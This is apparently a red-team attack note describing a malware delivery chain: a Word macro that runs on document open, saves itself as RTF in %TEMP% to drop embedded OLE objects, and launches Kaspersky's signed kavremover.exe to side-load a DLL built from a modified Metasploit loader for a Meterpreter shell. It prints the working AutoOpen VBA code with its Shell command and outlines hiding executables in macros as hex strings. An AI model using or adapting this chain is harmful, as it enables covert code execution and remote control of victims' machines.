# RTF + Signed binary + DLL hijacking + Custom MSF loader

RTF's default behavior of dropping embedded OLE objects into the TEMP directory with a DLL hijacking vuln of a trusted (and signed) executable (Kaspersky's kavremover.exe) and a custom made Meterpreter loader

## Execution

1. Save current file as RTF in %tmp%
2. Manually open it, since automatic opening does not drop OLE objects
3. open kavremover.exe
   * 2 x functions called by kavremover.exe (MsiGetProductInfoA, MsiGetProductInfoA)

## Custom MSF loader

We are going to modify Rafael Mudge’s Metasploit loader so that it can hijack kavremover.exe’s legitimate DLL and provide us with a meterpreter shell. Following the procedure described in the below blog posts we can identify that we need to change function main() to the following.

* [Loader](https://github.com/rsmudge/metasploit-loader/blob/master/src/main.c)
* [Tutorial 1](https://astr0baby.wordpress.com/2014/02/12/custom-meterpreter-loader-dll/)
* [Tutorial 2](https://astr0baby.wordpress.com/2014/02/13/customising-meterpreter-loader-dll-part-2/)

```vb
    Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr) 'For 64 Bit Systems

    Sub AutoOpen()
    Dim executable As String

    temp_path = Environ("TEMP") + "\"
    RTF_EXTENSION = ".rtf"
    qwerty = temp_path + "save_as_rtf" + RTF_EXTENSION

    Selection.WholeStory
        Selection.Copy
        Documents.Add Template:="Normal", NewTemplate:=False, DocumentType:=0
        Selection.PasteAndFormat (wdPasteDefault)
        ActiveDocument.SaveAs FileName:=qwerty, FileFormat:= _
            wdFormatRTF, LockComments:=False, Password:="", AddToRecentFiles:= _
            True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
            False, SaveNativePictureFormat:=False, SaveFormsData:=False, _SaveAsAOCELetter:=False
        Sleep (2)
    Application.Documents("clone_as_rtf.rtf").Close(Word.WdSaveOptions.wdDoNotSaveChanges)
    Sleep (2)

    Shell ("cmd /c start winword %TEMP%/save_as_rtf.rtf & timeout 5 & %TEMP%\kavremover.exe")

    End Sub
```

### Embedding an executable in a macro (executable2vbs)

Executable inside its code via hex dumps in strings.

1. Re-assemble the hex dump strings
2. Drop to a temporary directory
3. Execute [file2vbscript](http://www.didierstevens.com/files/software/file2vbscript_v0_3.zip)